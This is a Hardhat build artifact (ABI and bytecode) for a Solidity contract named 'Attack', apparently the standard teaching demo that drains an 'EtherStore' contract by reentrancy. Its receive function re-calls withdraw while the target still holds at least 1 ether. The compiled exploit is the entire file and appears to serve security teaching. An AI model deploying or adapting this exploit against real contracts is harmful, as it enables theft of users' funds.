{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/Attack.sol",
  "abi": [
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "etherStore",
      "outputs": [
        {
          "internalType": "contract EtherStore",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061046f806100206000396000f3fe6080604052600436106100385760003560e01c806312065fe01461011e5780639e5faafc14610149578063acd2e6e51461015357610119565b3661011957670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101175760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016100e49190610364565b600060405180830381600087803b1580156100fe57600080fd5b505af1158015610112573d6000803e3d6000fd5b505050505b005b600080fd5b34801561012a57600080fd5b5061013361017e565b604051610140919061038e565b60405180910390f35b6101516101be565b005b34801561015f57600080fd5b506101686102f1565b604051610175919061041e565b60405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631905090565b670de0b6b3a76400003410156101d357600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a50ec326670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561024357600080fd5b505af1158015610257573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016102bd9190610364565b600060405180830381600087803b1580156102d757600080fd5b505af11580156102eb573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b6000819050919050565b6000819050919050565b600061034e61034961034484610315565b610329565b61031f565b9050919050565b61035e81610333565b82525050565b60006020820190506103796000830184610355565b92915050565b6103888161031f565b82525050565b60006020820190506103a3600083018461037f565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006103e46103df6103da846103a9565b610329565b6103a9565b9050919050565b60006103f6826103c9565b9050919050565b6000610408826103eb565b9050919050565b610418816103fd565b82525050565b6000602082019050610433600083018461040f565b9291505056fea2646970667358221220054df5af85f868d600222afd9851d996d4901efb6b077ecfa0ca24ef6449a6cd64736f6c63430008110033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}